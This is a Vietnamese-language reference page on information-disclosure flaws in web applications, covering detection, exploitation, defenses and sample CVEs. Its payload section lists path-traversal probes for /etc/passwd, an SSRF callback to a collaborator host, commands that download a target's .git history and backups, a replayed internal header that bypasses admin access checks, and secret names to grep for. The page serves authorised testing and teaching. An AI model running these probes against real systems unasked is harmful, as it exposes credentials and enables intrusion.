# Information Disclosure

> Lỗi rò rỉ, comment, bản sao lưu, hoặc header để lộ dữ liệu nhạy cảm. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/information_disclosure.md`](../../../../Troubleshooting_Guide/information_disclosure.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** A01:2021 / A05:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
Lộ thông tin (information disclosure) là việc vô tình để lộ dữ liệu giúp ích cho kẻ tấn công — dữ liệu
nội bộ, bí mật, mã nguồn, hoặc chi tiết về công nghệ và cấu trúc của ứng dụng. Hiếm khi nó nguy hiểm
khi đứng riêng lẻ nhưng là bước trinh sát tiếp sức cho một cuộc tấn công nghiêm trọng hơn.

## Cơ chế hoạt động (How it works)
Sự rò rỉ đến từ việc ứng dụng tiết lộ nhiều hơn mức cần thiết: error/stack trace chi tiết để lộ phiên
bản framework và SQL, trang debug và tệp cấu hình bị bỏ lại sau khi triển khai, các artifact sao
lưu hoặc kiểm soát phiên bản (`.bak`, `.git`) được phục vụ như tệp tĩnh, comment HTML và JavaScript
chứa gợi ý nội bộ, phản hồi API quá chi tiết, hoặc các header như `Server` và `X-Powered-By`. Kẻ tấn
công chỉ kiểm soát các request; chính cấu hình sai hoặc xử lý lỗi cẩu thả của ứng dụng mới gây rò rỉ.

## Tác động (Impact)
Phiên bản framework bị lộ tiếp sức cho việc tra cứu exploit; bí mật bị rò rỉ (API key, thông tin xác
thực DB, khóa JWT/HMAC, machine key) trực tiếp cho phép vượt xác thực, deserialization, hoặc chiếm tài
khoản; mã nguồn bị lộ tiết lộ thêm các lỗ hổng và endpoint ẩn. Mức độ nghiêm trọng khi đứng riêng
thường thấp đến trung bình, nhưng một thông tin xác thực hoặc khóa bị lộ là nghiêm trọng (critical).

## Cách phát hiện (How to detect)
- Kích hoạt lỗi bằng đầu vào dị dạng (`productId=1'`, gây nhầm lẫn kiểu, endpoint sai) và quan sát
  stack trace, cú pháp SQL, đường dẫn tệp, hoặc banner phiên bản.
- Dò các tệp bị bỏ lại: `/.git/HEAD`, `/.env`, `/phpinfo.php`, `/backup.zip`, `/WEB-INF/web.xml`.
- Kiểm tra các header phản hồi (`Server`, `X-Powered-By`), comment HTML (view-source), `robots.txt`,
  sitemap, và tài liệu API (`/swagger`, `/openapi.json`) để tìm đường dẫn và lộ công nghệ.

## Khai thác (tóm tắt) (Exploitation)
Nhận diện stack từ các lỗi và header, rồi liệt kê các đường dẫn ẩn và artifact sao lưu/mã nguồn.
Tái dựng lịch sử `.git` để khôi phục các bí mật đã được "xóa" nhưng vẫn còn trong các commit cũ, đào
`phpinfo`/trang debug để tìm khóa, và dùng TRACE để làm lộ các header xác thực nội bộ mà bạn có thể
phát lại. Nối bất kỳ bí mật hoặc endpoint khôi phục được vào cuộc tấn công kế tiếp tương ứng. Danh sách
dò đầy đủ nằm trong phần Payload.

## Payload & kỹ thuật (Payloads & techniques)

> Chắt lọc từ các tài liệu payload thực chiến — chỉ dành cho kiểm thử được cấp phép.

### Tổng quan vector (Vector overview)

| Vector | Probe | Tìm gì |
|--------|--------|----------|
| Trang debug | `/phpinfo.php`, `/debug` | `SECRET_KEY`, thông tin xác thực, đường dẫn máy chủ |
| Thông báo lỗi | `productId=1'`, endpoint sai | Stack trace, phiên bản framework |
| Tệp sao lưu / mã nguồn | `/.bak`, `/backup.zip`, `/WEB-INF/web.xml` | Mã nguồn, thông tin xác thực hardcode |
| Lịch sử `.git` | `/.git/` | Commit, mật khẩu bị rò rỉ |
| Phương thức TRACE | `TRACE /path` | Header xác thực nội bộ |
| robots.txt / sitemap | `GET /robots.txt` | Đường dẫn ẩn |
| Comment HTML | view-source | Liên kết debug, TODO |
| Swagger / OpenAPI | `/api-docs`, `/swagger` | Endpoint API |

### Trang debug & comment HTML (Debug pages & HTML comments)

```text
/cgi-bin/phpinfo.php
/phpinfo.php
/info.php
/debug.php
```
Tìm `SECRET_KEY`, thông tin xác thực cơ sở dữ liệu, đường dẫn máy chủ, các extension đã nạp. Xem mã nguồn (`Ctrl+U`) để tìm comment ẩn:
```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
<!-- TODO: remove before production -->
<!-- admin panel at /admin -->
```

### Rò rỉ qua thông báo lỗi (Error-message disclosure)

Kích hoạt các lỗi chi tiết để làm lộ cú pháp SQL, tên bảng, phiên bản, và đường dẫn.
```text
# SQL error
/product?productId=1'
/product?productId=-1
/product?productId=999999

# Path traversal
/image?filename=../../../../etc/passwd
/file?path=..\..\..\windows\system32\drivers\hosts

# SSRF / OOB
/api/fetch?url=http://YOUR-COLLABORATOR.oastify.com

# Stack traces
/admin
/wrong-endpoint
/api/v1/missing
```
Một banner framework (ví dụ `Apache Struts 2 2.3.31`) tiếp sức trực tiếp cho việc tra cứu exploit: `searchsploit Apache Struts 2.3.31`.

### Rò rỉ mã nguồn & bản sao lưu (Source-code & backup disclosure)

```text
# Generic backups
/backup  /backup.sql  /backup.tar.gz  /backup.zip
/backup.old  /backup.bak  /database.sql  /dump.sql
/.bak  /.backup  /.swp  /.swo

# Language/framework specific
/WEB-INF/web.xml  /index.php.bak  /ProductTemplate.java.bak
/Config.cs  /source  /src  /htdocs
/__pycache__/  /config.py.bak  /.git/
```
```bash
wget https://TARGET/backup/ProductTemplate.java.bak
```
Kiểm tra để tìm mật khẩu hardcode, API key, JWT secret, thông tin xác thực DB, đường dẫn nội bộ.

### Lịch sử kiểm soát phiên bản (`.git`) (Version-control history)

```text
/.git/HEAD
/.git/config
/.git/index
```
Tải về và đào kho mã:
```bash
wget -r https://TARGET/.git
cd TARGET/.git && ls -la
git log
git log -p
git show COMMIT_HASH
git diff HEAD~1
git show HEAD:file
```
Các diff thường để lộ bí mật đã được "xóa" nhưng vẫn còn trong lịch sử:
```text
- ADMIN_PASSWORD=05psjctjzftuafv8menz
+ ADMIN_PASSWORD=env('ADMIN_PASSWORD')
```

### Phương thức TRACE (phát hiện header nội bộ) (TRACE method)

```http
TRACE /admin HTTP/1.1
Host: TARGET
```
TRACE phản chiếu lại tất cả header, để lộ các header xác thực tùy chỉnh (ví dụ `X-Custom-IP-Authorization`). Phát lại header phát hiện được để vượt qua các kiểm soát:
```http
GET /admin HTTP/1.1
Host: TARGET
X-Custom-IP-Authorization: 127.0.0.1
```

### robots.txt / sitemap

```bash
curl -s https://TARGET/robots.txt
curl -s https://TARGET/sitemap.xml
```
Các mục `Disallow` quảng cáo các đường dẫn ẩn:
```text
User-agent: *
Disallow: /backup
Disallow: /admin
Disallow: /debug
```

### Liệt kê thư mục & endpoint (Directory & endpoint enumeration)

```bash
gobuster dir -u https://TARGET/ -w /usr/share/wordlists/dirb/common.txt -t 40
ffuf -u https://TARGET/FUZZ -w wordlist.txt
```
Các đường dẫn và tệp giá trị cao:
```text
/admin  /Admin  /ADMIN  /api  /api/v1  /api/v2
/console  /debug  /backup  /server-status
/.git  /.git/HEAD  /.git/config  /.gitignore
/.env  /.htaccess  /.htpasswd  /phpinfo.php
```

### Tài liệu API (API documentation)

```text
/api  /api-docs  /docs  /rest
/swagger  /swagger-ui  /swagger.json
/openapi.json  /graphiql  /graphql  /console
```

### Các bí mật cần grep (Secrets to grep for)

```text
SECRET_KEY      ADMIN_PASSWORD   DATABASE_URL
JWT_SECRET      AWS_ACCESS_KEY   AWS_SECRET_KEY
API_KEY         STRIPE_KEY       SENTRY_DSN
```

### Các lệnh cURL trinh sát một dòng (cURL recon one-liners)

```bash
# Internal headers via TRACE
curl -X TRACE -v https://TARGET/admin

# Response headers / server banner
curl -I https://TARGET/
curl -I https://TARGET/ | grep -i server

# robots.txt
curl -s https://TARGET/robots.txt

# Sweep common paths
for path in /admin /api /debug /phpinfo.php /.git/HEAD /robots.txt; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://TARGET$path)
  echo "$path -> $status"
done
```

## Phòng chống (Defenses)
1. **Xử lý lỗi chung chung** — hiển thị cho người dùng một thông báo chung; chỉ ghi log stack trace đầy
   đủ ở phía máy chủ. Tắt chế độ debug và các trang lỗi của framework trong môi trường production.
2. **Không triển khai các artifact nhạy cảm** — chặn/xóa `.git`, bản sao lưu, mã nguồn, `.env`, và trang
   debug; chỉ phục vụ một danh sách cho phép tường minh các đường dẫn tĩnh.
3. **Loại bỏ các header và nội dung gây lộ** — xóa/làm rối `Server`/`X-Powered-By`, làm sạch comment
   HTML, và chỉ trả về các trường mà mỗi phản hồi thực sự cần.
4. **Tắt các phương thức rủi ro** (TRACE/TRACK) và giữ bí mật ra khỏi mã nguồn — dùng trình quản lý bí
   mật và xoay vòng bất kỳ khóa nào đã từng bị commit.
5. Rà soát mã và cấu hình để tìm thông tin xác thực hardcode trước khi triển khai; coi lịch sử `.git`
   là một phần của bề mặt tấn công.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=Information+Disclosure
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Information+Disclosure
- **Exploit-DB** — https://www.exploit-db.com/search?q=Information+Disclosure
- **GitHub Advisories** — https://github.com/advisories?query=Information+Disclosure
- **OSV** — https://osv.dev/list?q=Information+Disclosure
- **Cộng đồng** — r/netsec, blog bảo mật của nhà cung cấp, HackerOne Hacktivity, X/Twitter infosec.
- _Mẹo tìm kiếm: thêm sản phẩm mục tiêu + phiên bản, ví dụ `Information Disclosure <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2021-44228` — Log4Shell; việc ghi log chi tiết đầu vào của kẻ tấn công là trọng tâm, và việc lộ
  stack trace/phiên bản xung quanh đó hỗ trợ việc nhắm mục tiêu (tác động chính là RCE).
- `CVE-2017-5638` — Đường lỗi của Apache Struts 2 để lộ chi tiết và cho phép RCE; việc lộ banner
  framework thường đi trước hoạt động khai thác Struts.
- _Sự cố kinh điển: các thư mục `.git` và tệp `.env` bị phơi bày trên các host production đã nhiều lần
  làm rò rỉ khóa AWS và thông tin xác thực DB, một lớp lỗi tái diễn trong bug-bounty._

## Tham khảo (References)
- PortSwigger Web Security Academy — Information disclosure.
- OWASP — Improper Error Handling / Information Leakage cheat sheets; WSTG "Information Gathering".
- OWASP Top 10 — A05:2021 Security Misconfiguration.
